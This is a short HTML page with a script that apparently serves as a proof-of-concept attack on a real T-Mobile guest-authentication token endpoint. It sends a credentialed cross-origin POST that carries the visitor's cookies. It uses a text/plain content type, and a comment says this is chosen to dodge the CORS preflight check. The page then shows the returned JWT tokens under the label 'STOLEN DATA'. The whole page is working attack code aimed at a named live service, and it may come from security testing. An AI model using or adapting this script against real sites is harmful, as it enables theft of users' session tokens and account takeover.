<!DOCTYPE html>
<html>
<body>
    <h2>T-Mobile Data Exfiltration Test</h2>
    <button onclick="stealTokens()">Click to Steal JWT Tokens</button>
    <pre id="display" style="background:#eee; padding:10px;"></pre>

    <script>
        async function stealTokens() {
            const display = document.getElementById('display');
            // The endpoint that gave you the 200 OK in Burp
            const url = "https://adn.t-mobile.com/guest-auth/prd01/guest/v1/tokens";
            
            try {
                const response = await fetch(url, {
                    method: 'POST',
                    credentials: 'include', // Important: This sends the cookies!
                    headers: {
                        'Content-Type': 'text/plain' // Using text/plain avoids the preflight block
                    },
                    body: JSON.stringify({ "client_id": "SIDWeb" })
                });

                const data = await response.text();
                display.innerText = "STOLEN DATA:\n" + data;
                console.log("Success:", data);
            } catch (err) {
                display.innerText = "Error: " + err + "\nCheck Console for CORS block.";
            }
        }
    </script>
</body>
</html>
